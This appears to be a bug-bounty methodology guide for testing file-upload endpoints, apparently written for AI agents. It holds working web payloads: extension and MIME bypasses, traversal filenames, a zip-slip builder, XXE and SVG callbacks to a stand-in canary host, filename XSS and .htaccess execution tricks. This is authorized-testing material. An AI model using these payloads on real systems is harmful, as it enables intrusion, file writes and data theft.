---
technology: "File processing (upload handling and parser attack surface)"
kind: bug-bounty-methodology
audience: ai-agent
family: web-platforms
version: "1.0"
last-refresh: "2026-11-19"
status: upstream-only
provenance: "upstream-verified methodology, 2026-11-19 — synthesised from OWASP WSTG (file-upload, CSV-injection, XXE), PortSwigger XXE/file-upload research, the Snyk Zip Slip whitepaper (2018) and 2024 package advisories, the ImageMagick security-policy docs, the Pillow security handbook, and PyTorch/picklescan model-load advisories (CVE-2025-32434, CVE-2026-53875). Companion overview [[file-processing]]; parser-specific pages [[file-processing-exiftool]], [[file-processing-imagemagick]]; deserialization cross-ref [[java-deserialization]]."
source: "WebSearch/WebFetch research pass 2026-11-19; every command verified against the cited tool docs/advisories. No invented flags or CVEs."
---

Companion pages: [[file-processing|File-processing overview]] — the router and parser-fingerprint table. Parser-specific chains live in [[file-processing-exiftool|ExifTool]] and [[file-processing-imagemagick|ImageMagick]]. Pickle/Java object chains cross-ref [[java-deserialization]]. Tool notes (exiftool, ffuf, interactsh-client, …) live in the separate tools vault.

---

# File-ingestion penetration testing methodology

**A bug hunter's field guide to upload endpoints and parser attack surface — v1.0 (2026-11-19)**

**In scope:** the *ingestion pipeline* an app wraps around a file — the upload endpoint and its validation, where the bytes land and under what name, how archives are expanded, and which parser eventually reads the content. The parser-specific exploit bodies (ExifTool DjVu RCE, ImageMagick delegates, FFmpeg playlists) live in the sibling pages; this page is the *methodology that gets you to the parser and proves the bug once you are there*.

**Out of scope:** the internals of any one parser's CVE (see the sibling pages), and binary memory-corruption fuzzing — a field methodology proves logic and injection bugs with single crafted files, not crash-mining.

**Audience:** bug hunters and red teamers under an authorized program. Every technique here is single-request, low-volume, and evidence-first. Decompression bombs and memory-exhaustion probes are deliberately **REPORT-class** — you describe and bound them, you do not detonate them against a production worker (see §7).

---

## 1. The ingestion model in one page

An upload feature is a conveyor with four independent gates, and a finding lives at every seam between them:

1. **Accept** — the endpoint decides *whether* to take the file (extension, `Content-Type`, magic bytes, size).
2. **Store** — the bytes get a name and a location on disk or in a bucket (the *filename* is attacker-influenced data crossing into a path).
3. **Expand** — archives, container formats, and nested documents get walked (zip-slip, symlink races, bombs).
4. **Parse** — some engine reads the *content* (XML, image, spreadsheet, pickle) and the content is code to that engine.

The single most productive sentence here: **validation checks what a file claims to be; the gates after it act on what the file is.** Accept-gate checks are string games on the name and the first few bytes. Everything that actually hurts — code under the web root, a file written outside the upload dir, an entity callback to your canary, a formula executing in someone's spreadsheet — happens at Store/Expand/Parse, which never re-ask the Accept gate's question.

### Where the money is (triage priority)

| Priority | Class | Where in the pipeline | Typical severity |
|---|---|---|---|
| 1 | Upload → execution (web-shell, inclusion into web root) | Accept bypass + Store location | Critical |
| 2 | Path traversal in the stored filename (write outside upload dir) | Store | High–Critical |
| 3 | Zip-slip / symlink race on archive extraction | Expand | High–Critical |
| 4 | XXE in a document parser (DOCX/XLSX/SVG/XML) | Parse | High (file read / SSRF) |
| 5 | Deserialization of an uploaded object (pickle model, Java blob) | Parse | Critical |
| 6 | SVG / HTML stored XSS served from the app origin | Store + serve | Medium–High |
| 7 | SSRF via parser URL handlers (SVG `<image href>`, XXE, FFmpeg playlist) | Parse | High |
| 8 | CSV / formula injection into a downstream spreadsheet | Store (deferred) | Medium (environment-gated) |
| 9 | LFI / XSS via a reflected or echoed filename | Store + reflect | Medium |
| 10 | Decompression / pixel bomb (DoS) — REPORT-class | Expand / Parse | Low–Medium |

Phases 2–3 are the accept-gate and storage work that every target needs; Phases 4–6 are where the payouts concentrate; Phase 7 is the DoS class you report without firing.

---

## Phase 0 — Recon: fingerprint the pipeline before you feed it

Goal: learn which of the four gates exist and what parser sits at the end, *before* crafting anything.

```bash
# What does a benign upload actually do? Baseline first.
curl -s https://example.com/upload -F 'file=@hello.png;type=image/png' -i
# -> read: returned URL/path, any id, whether a derivative (thumbnail) is made,
#    and the Location/Content-Disposition of the stored file when you fetch it back
```

Questions the baseline answers:

- **Where did it land?** Fetch the file back. A predictable path (`/uploads/<original-name>`) under the app host is an inclusion/traversal candidate; an opaque CDN URL on a different origin is a much smaller surface.
- **Was it re-encoded?** Upload a JPEG with a marker EXIF `Comment` and read the stored copy with `exiftool`. If the comment survives byte-for-byte, no re-encode — polyglots and embedded payloads survive. If it is gone, a real decoder re-wrote the file (polyglots die; see §4).
- **Which parser confesses itself?** A generated thumbnail proves an image pipeline (ImageMagick/Pillow — see [[file-processing-imagemagick]]); a returned PDF's `Creator` tag names the generator; a metadata field echoed back proves ExifTool-class reflection ([[file-processing-exiftool]]).
- **What is enforced where?** Change the `Content-Type`, then the extension, then the magic bytes one at a time and watch which rejection message changes. Each gate you can isolate is a gate you can bypass in isolation.

Record every rejection verbatim — the message text ("invalid extension" vs "invalid image") tells you which gate fired and is your diff baseline for the bypass phase.

---

## Phase 1 — Enumerate upload surfaces

Not every upload is a visible "choose file" box. Enumerate all of them:

```bash
# Multipart endpoints and file params from the app's own JS / API docs
# then the predictable paths
for p in upload uploads import files file avatar attachment media \
         profile/photo api/v1/files documents report/import; do
  curl -s -o /dev/null -w "%{http_code} /$p\n" https://example.com/$p
done
```

Surfaces that are easy to miss: profile-avatar and company-logo setters; "import from CSV/XLSX" and bulk-user uploaders (CSV-injection and XXE land here); rich-text editors that accept image paste (often a raw upload API behind them); SVG icon/theme uploaders; "scan to PDF" / document-conversion features; webhook or API endpoints that accept a base64 blob; and any `url=` importer that *fetches* a file server-side (SSRF before a byte is even uploaded). For each, note the four gates from §1 — the deliverable is a per-endpoint table of `{accept checks, store path shape, does-it-expand, which parser}`.

---

## Phase 2 — Accept-gate bypasses

Goal: get a file the gate was meant to refuse past the gate. Test the four accept checks independently — they are usually ANDed naively and each has its own bypass family.

### 2.1 Extension-filter bypasses

For blocklist filters (reject `.php`), cycle alternates; for allowlist filters (require `.jpg`), chase parser/server disagreements about which extension "wins".

| Trick | Example | Why it works |
|---|---|---|
| Case variation | `shell.pHp`, `x.PHtml` | filter compares lowercase, filesystem/handler does not |
| Double extension | `shell.jpg.php`, `shell.php.jpg` | Apache `mod_mime` can map a file on *any* recognised extension in the name |
| Less-common handler ext | `.phtml` `.php5` `.pht` `.phar` / `.asp;.cer` / `.jsp` variants | blocklist misses the alias the handler still executes |
| Trailing bytes | `shell.php.` `shell.php%20` `shell.php%00` (historic) | trailing dot/space/null stripped *after* the check, before write |
| NTFS alternate stream | `shell.php::$DATA` | the `::$DATA` suffix is stripped by Windows, leaving `shell.php` |
| Path in the name | `shell.php/.` `shell.php/` | some parsers trim the trailing `/.` post-validation |

The null byte (`shell.php%00.jpg`) is a historic truncation bug (pre-2011 PHP, legacy C file APIs that stop at `\0` while the validator reads the full string) — one line in a modern report, but still live against old stacks and worth one probe.

```bash
# One representative probe per family — diff the response against the §0 baseline rejection
curl -s https://example.com/upload --form-string 'file=@shell.php.jpg;filename=shell.php.jpg;type=image/jpeg'
```

Note the `--form-string` / explicit `filename=`: the multipart `filename` field is attacker-controlled independently of the local file, which is the whole point — you control name and content separately.

### 2.2 Content-Type trust

The multipart `Content-Type` is a client-supplied string; an app that trusts it has no gate at all.

```bash
# PHP payload, but claim an image type — defeats naive MIME checks
curl -s https://example.com/upload \
  --form-string 'file=@shell.php;filename=shell.php;type=image/png'
```

If this is accepted where a `type=application/x-php` was rejected, the gate trusts the header. Report the header-trust itself; it is usually the load-bearing half of a shell upload.

### 2.3 Magic-byte checks and polyglots

Stronger apps sniff the leading bytes (libmagic / content-sniffing). Two moves:

- **Header spoof:** prepend a valid signature so the sniff passes while the tail carries the payload — `GIF89a;` before PHP, a JPEG `FFD8FFE0` header before an archive. A pure content-sniff only reads the front.
- **Polyglot:** build a file that is genuinely valid in *two* formats, so it survives even a parser that fully reads it. Classic shapes: **GIFAR** (valid GIF + valid archive), **phar-JPEG** (a JPEG whose tail is a valid PHAR — dangerous only if the app later touches it through a `phar://` wrapper, the deserialization trigger; cross-ref [[java-deserialization]] for the object-chain half), and a JPEG whose `COM`/`EXIF` segment hides script that a second parser executes. The construction target is a byte layout that satisfies both format validators at once.

The decisive defence to probe against: **re-encoding.** If §0 showed the stored copy was re-encoded by a real decoder, a polyglot's non-image bytes are stripped and this whole family is dead — pivot to Store/Parse bugs instead. If the stored bytes are intact, the polyglot rides through.

### 2.4 The server-config upload (CTF-classic, sometimes real)

Where the upload dir maps into a web root, uploading a config file is often easier than smuggling a shell: a `.htaccess` that adds `AddType application/x-httpd-php .xyz` (Apache), or a `web.config` (IIS), re-enables execution for a benign-looking extension you then upload. Only works when the dir is both writable and served with the relevant handler — but when it is, it turns an allowlist into nothing.

---

## Phase 3 — Store-gate: where the file lands and under what name

Even a correctly-typed file is a finding if the *name* or *location* is attacker-controlled. The filename is the most overlooked injection channel in the whole pipeline.

### 3.1 Path traversal in the stored filename

If the app builds the storage path from the client filename, `../` climbs out of the upload directory.

```bash
# Does the filename control the write path?
curl -s https://example.com/upload \
  --form-string 'file=@note.txt;filename=../../../../var/www/html/example/pwn.txt;type=text/plain'
# then confirm the write landed where traversal aimed:
curl -s https://example.com/pwn.txt
```

Proof is the **retrievable write at the traversed location**, not a 200. Two destinations matter most: into the **web root** (write `.php`/`.jsp` → execution), or into a **cron/daemon-watched directory** (the overview's cron-pipeline shape — a file dropped where a scheduled parser runs becomes code on a timer, no request ever hitting the payload). This is exactly the class python-multipart shipped as **CVE-2026-24486** — arbitrary file write via traversal in the uploaded filename when an app kept the client filename (`UPLOAD_KEEP_FILENAME`) under a fixed `UPLOAD_DIR`.

Encoded and platform variants to try when the raw form is filtered: `%2e%2e%2f`, `..\\` and `....//` (naive single-pass `../` stripping leaves one `../` behind), absolute paths (`/var/www/...`), and on Windows `..%5c`.

### 3.2 Zip-slip and archive extraction

When the app accepts an archive (`.zip`, `.tar.gz`, `.jar`, `.apk`, `.7z`) and extracts it, each *entry name* inside the archive is a write path — and archive entries can contain `../` that most extractors do not validate. This is **Zip Slip** (Snyk, 2018; still shipping — e.g. CVE-2024-47877 in `codeclysm/extract`, `unzip-stream` < 0.3.2 in 2024). A single crafted entry named `../../../../var/www/html/example/shell.jsp` writes outside the extraction root on extract.

```bash
# Build a zip whose ONE entry traverses out (python zipfile writes the literal name)
python3 -I - <<'PY'
import zipfile
with zipfile.ZipFile('slip.zip','w') as z:
    z.writestr('../../../../tmp/zipslip_canary.txt', 'written-outside-root\n')
PY
# upload slip.zip, then look for the file at the traversed destination
```

Evidence = the entry materialising outside the extraction directory. **Symlink race (one line):** an archive entry that is a *symlink* to an absolute path (`/etc/example/config`) followed by a second entry that writes *through* that name — or a TOCTOU swap of an extracted path between check and open — turns extraction into arbitrary read/write; test only where extraction order and symlink-following are both observable.

### 3.3 Storage-name quirks and content-disposition

- **Collision / overwrite:** if the app keeps the original name, upload a file named like an existing server asset (`robots.txt`, another user's known filename) and check whether it overwrites or lets you read across users.
- **Content-Disposition reflection:** when the app echoes the filename into a `Content-Disposition: attachment; filename="..."` header on download, a filename containing a newline or quote is a **header-injection / response-splitting** probe; a filename echoed into HTML (a file-manager listing) is a **stored-XSS** probe. RFC 6266's `filename*` (`filename*=UTF-8''...`) is the encoded channel worth testing when the plain `filename=` is sanitised.
- **Unicode tricks:** a right-to-left-override (`U+202E`) in the name disguises the real extension to a human reviewer (`photo‮gnp.php` renders as `photo⁨php.png⁩`); NFKC normalisation *after* the extension check can fold a lookalike character back into a dangerous extension; overlong UTF-8 encodings of `/` or `.` slip past byte-level filters that a later normaliser undoes.

---

## Phase 4 — Parser confusion: content is code to the engine

Goal: the content channel. Once bytes reach a parser, the file's *structure* is a program. Pick the probe by the parser §0 fingerprinted.

### 4.1 XXE — the document-parser class (safe OOB detection)

Any ingest path that parses XML is an XXE candidate, and that is a much wider surface than a `.xml` upload: **DOCX/XLSX/PPTX** are zip containers of XML parts, **SVG** is XML, and SAML/RSS/config importers are XML. The safe, high-signal detection is an **external-entity probe to a canary endpoint you control** — a DNS/HTTP hit proves the parser resolved your entity, with zero data touched.

```xml
<!-- Minimal OOB canary: a hit on $COLLAB proves external-entity resolution -->
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "http://canary.$COLLAB/xxe-hit"> ]>
<r>&x;</r>
```

Run a listener — `interactsh-client` or Burp Collaborator — and watch for the inbound request; its unique subdomain ties the hit to this exact upload. For DOCX/XLSX, inject the DOCTYPE into one of the inner XML parts (`word/document.xml`, `xl/workbook.xml`) and re-zip. When the direct form is filtered, switch to a **parameter entity** declared in the internal DTD, or host an **external DTD** on `$COLLAB` that the parser fetches and runs — the external-DTD path is also the route to *exfiltration* (slice a local file into the callback URL) once you have confirmed resolution and the program scope permits reading files.

Caveats that keep the report honest: modern libxml2 (2.9+) hardened how parameter entities from an external DTD interact with later entity definitions, so a **failed callback does not prove the endpoint is safe** — try the parameter-entity and external-DTD forms before concluding. And the proof standard for XXE is the **canary interaction or the reflected file content**, never a parser crash (a crash is a separate, weaker DoS observation).

### 4.2 SVG and HTML — stored XSS / SSRF from the app origin

An SVG served back as `image/svg+xml` from the application's own origin is active content in that origin — stored XSS if a victim opens it.

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://canary.$COLLAB/svg-xss')"/>
```

A callback on `$COLLAB` when the file is *viewed* (not when you upload it) proves execution in the victim's context. Sanitiser-bypass forms worth cycling: the root-element `onload` handler (defeats sanitisers that only strip `<script>`); `<foreignObject>` wrapping ordinary HTML (`<img onerror>`, `<iframe srcdoc>`) parsed with HTML rules; and `<image href="http://169.254.169.254/...">` / `xlink:href` as a **server-side SSRF** channel when the SVG is rasterised server-side rather than served raw. The decisive question is what `Content-Type` and which origin the stored file is served with — an SVG forced to `text/plain`, or served from a sandbox domain, is defused.

### 4.3 Decompression / pixel bombs — REPORT-class only

An image that declares vast dimensions or decompresses to enormous size is a memory-exhaustion DoS. **This is REPORT-class: you describe and bound it from parser metadata, you do not detonate it against a production worker.** The point to make in the report is that a control exists and whether the target set it:

- **ImageMagick** gates this in `policy.xml` (`width`/`height`/`area` limits; the docs' own example is a crafted `20000x20000` image). Verify on a box you control with `identify -list policy`; against a target, the signal is whether a *modestly* oversized declared dimension is rejected cleanly — you never need to send the full bomb.
- **Pillow** raises `DecompressionBombError` above twice `MAX_IMAGE_PIXELS` (default `89,478,485`, so the error threshold is `178,956,970`) and only warns above `1×`. Known bypasses to note if source is in scope: the check runs on the **first frame only**, so a later frame of an animated image can exceed it.
- **Zip/XML bombs** (nested archives, billion-laughs entity expansion) are the Expand-gate equivalent — report the *absence of a nesting/expansion limit* rather than the detonation.

Evidence here is the declared-size rejection behaviour and the missing-limit observation, not a downed worker.

### 4.4 CSV / formula injection — the deferred, downstream class

When an app lets users upload or generate data that is later **exported to CSV and opened in a spreadsheet**, a cell beginning with a formula trigger (`=`, `+`, `-`, `@`, or a leading tab/CR) is executed by Excel/LibreOffice/Calc on open — a cross-user attack that fires in the *victim's* spreadsheet app, not on the server.

Detection stays benign and environment-honest: inject a cell whose formula is a **harmless probe** — arithmetic the viewer can see evaluate, or a `=HYPERLINK`/web-query form that calls back to `$COLLAB` when the victim's app resolves it — never a `cmd`/DDE command-execution payload on a live target. OWASP WSTG (Testing for CSV Injection) frames it exactly this way: prove formula *evaluation*, note that DDE-to-RCE is highly environment-dependent, and confirm the mitigation survives a save-and-reopen. Report impact as "a crafted record executes in any user who exports and opens this data", and recommend the output-side fix (prefix risky cells with `'`, or strip leading trigger characters).

### 4.5 Deserialization of uploaded objects (one line + cross-ref)

An upload that is *deserialized* server-side is direct code execution: a **Python pickle** (an ML `.bin`/`.pt` checkpoint reaches `torch.load`, which runs pickle — `weights_only=True` is a mitigation, itself bypassed pre-2.6.0 by CVE-2025-32434, and `picklescan` < 1.0.3 is evadable per CVE-2026-53875), a **Java serialized blob**, or a PHP `phar://` trigger. The object-chain craft and gadget selection live in [[java-deserialization]]; from the ingestion side your job is only to spot that an upload reaches a deserializer and prove it with a benign callback gadget to `$COLLAB`.

---

## Phase 5 — Filename reflection: LFI and XSS via the echoed name

Distinct from §3's *storage* path: here the filename is **echoed into a response** — a success message, a file-manager listing, a log viewer, a generated document.

- **Reflected into HTML** → stored/reflected XSS: upload a file named `"><img src=x onerror=fetch('https://canary.$COLLAB/fn-xss')>.png` and watch where the name is rendered.
- **Reflected into a server-side include/template** → LFI/SSTI: a filename like `{{7*7}}.png` or `../../../etc/passwd` that is later used to *build a path the server reads and returns* is local file inclusion driven by the name rather than the bytes.
- **Reflected into a download header** → the Content-Disposition injection from §3.3.

The proof is the reflection firing (canary callback, `49` from `{{7*7}}`, `/etc/passwd` contents in the body), tied to the uploaded name.

---

## Phase 6 — Chaining: upload is a primitive, not usually the finding

Single gates rarely pay alone; the chains do. The recurring ones:

- **Accept-bypass (§2) + web-root storage (§3.1) → RCE.** The canonical shell-upload: defeat the type check, land executable bytes where the server runs them.
- **Archive accept (§2) + zip-slip (§3.2) → write into web root or cron dir → RCE.** No type bypass on the *payload* needed — the archive is the allowed type, the entry name is the weapon.
- **XXE (§4.1) + internal-only services → SSRF → cloud metadata.** A DOCX importer reaching `http://169.254.169.254/` is a document upload turned internal-network pivot.
- **SVG SSRF (§4.2) / FFmpeg playlist (see [[file-processing]]) → internal read.** Parser URL handlers are SSRF engines.
- **Traversal write (§3.1) + a parser cron (overview) → scheduled RCE as the cron user.** Quieter and often more privileged than the web path.

---

## Phase 7 — Evidence standards (the parser-bug proof bar)

The discipline that keeps this deployable and the reports credible:

- **A parser bug is proven by a canary interaction or a reflected parse — not by a crash.** An OOB hit on `$COLLAB` (XXE, SVG, deserialization gadget), a file's bytes reflected back, a formula visibly evaluating, a web-shell returning a command's output: these are proof. A 500 or a hung worker is, at best, a weak DoS note and at worst noise — do not file "the parser crashed" as a parse-injection finding.
- **DoS/bomb classes are REPORT-class.** Describe the missing limit (pixel cap, nesting cap, field-size cap), show the declared-oversize rejection behaviour, and bound the impact analytically. Do not detonate a bomb against a production worker — a single oversized *declaration* that the gate should reject is enough signal.
- **Write-primitive proof is the retrievable artefact at the destination**, written with benign content (a dated canary string), then cleaned up — never an overwrite of a real file whose loss you cannot reverse.
- **Scope the canary.** Use infrastructure you control (`interactsh-client`, Collaborator) and a per-test unique subdomain so every interaction is attributable to one upload; never point a probe at third-party infrastructure.
- **One request per probe.** The whole methodology is single-file, single-request — a crafted file is a scalpel, not a flood.

### Reporting shape

Title impact-first ("Unauthenticated RCE via web-shell upload — `Content-Type` trusted on `POST /upload`"). Give the exact crafted file (name **and** bytes — they are separate channels), the one request, expected-vs-actual, and the retrieved proof. For deferred classes (CSV, stored XSS) state the victim condition plainly ("fires when any user exports and opens the report"). Map to CWE: CWE-434 (unrestricted upload), CWE-22 (traversal / zip-slip), CWE-611 (XXE), CWE-502 (deserialization), CWE-1236 (formula injection), CWE-409 (decompression bomb).

---

## Phase 8 — CTF notes (the upload-box genre)

Upload challenges are a recognisable genre with a small move-set — run it in order:

1. **Read the filter first.** Blocklist (banned extensions) → alternate handler extensions (`.phtml`, `.pht`, `.php5`) and case tricks. Allowlist (only `.jpg`) → double extension, magic-byte + content-sniff games, or the `.htaccess`/`web.config` config-upload to make an allowed extension execute.
2. **Find where it lands.** Guess `/uploads/`, read the response for the path, diff the stored bytes against what you sent (re-encode kills polyglots).
3. **Polyglot when both a type check and an image parser are in the way** — `GIF89a;`-prefixed shell, or an EXIF-comment payload (`exiftool -Comment='<?php …?>' x.jpg`) when the metadata survives.
4. **Race the window** — upload-then-overwrite and upload-then-delete races are common CTF framings; a handful of parallel requests hits the TOCTOU window.
5. **Chain to LFI** — many boxes pair a restricted uploader with a separate `?page=`/`file=` LFI; the upload just has to land *parseable text anywhere*, and the LFI includes it.
6. **phar / pickle / XXE** when the challenge hands you a parser rather than a web root — the flag is a canary callback or a file read, same as the real-world bar above.

---

## References (consulted 2026-11-19)

- OWASP WSTG — Testing Upload of Unexpected File Types / Malicious Files — https://owasp.org/www-project-web-security-testing-guide/latest/
- OWASP WSTG — Testing for CSV Injection — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/21-Testing_for_CSV_Injection
- PortSwigger Web Security Academy — XXE (blind / OOB, external DTD) — https://portswigger.net/web-security/xxe
- PortSwigger Web Security Academy — File upload vulnerabilities — https://portswigger.net/web-security/file-upload
- Snyk — Zip Slip technical whitepaper (2018) — https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf
- Snyk advisory — Zip Slip in `codeclysm/extract` (CVE-2024-47877) — https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCODECLYSMEXTRACT-8184982
- Snyk advisory — Zip Slip in `unzip-stream` < 0.3.2 — https://security.snyk.io/vuln/SNYK-JS-UNZIPSTREAM-7833828
- ImageMagick — Security Policy (`policy.xml`, pixel/area limits, `identify -list policy`) — https://imagemagick.org/security-policy/
- Pillow — Security handbook (`MAX_IMAGE_PIXELS`, `DecompressionBombError`) — https://pillow.readthedocs.io/en/stable/handbook/security.html
- PyTorch `torch.load` RCE despite `weights_only=True` (CVE-2025-32434) — https://nvd.nist.gov/vuln/detail/CVE-2025-32434
- picklescan evasion (CVE-2026-53875, < 1.0.3) — https://www.sentinelone.com/vulnerability-database/cve-2026-53875/
- FortiGuard Labs — SVG attack-surface anatomy — https://www.fortinet.com/blog/threat-research/scalable-vector-graphics-attack-surface-anatomy.html
- OpenSSF Secure Coding Guide (Python) — CWE-409 data amplification — https://best.openssf.org/Secure-Coding-Guide-for-Python/CWE-664/CWE-409

*Researched and written 2026-11-19 against OWASP WSTG, PortSwigger, the Snyk Zip Slip whitepaper and 2024 package advisories, the ImageMagick and Pillow security docs, and the PyTorch/picklescan model-load advisories; every command verified against the cited documentation. Model claude-opus-4-8.*
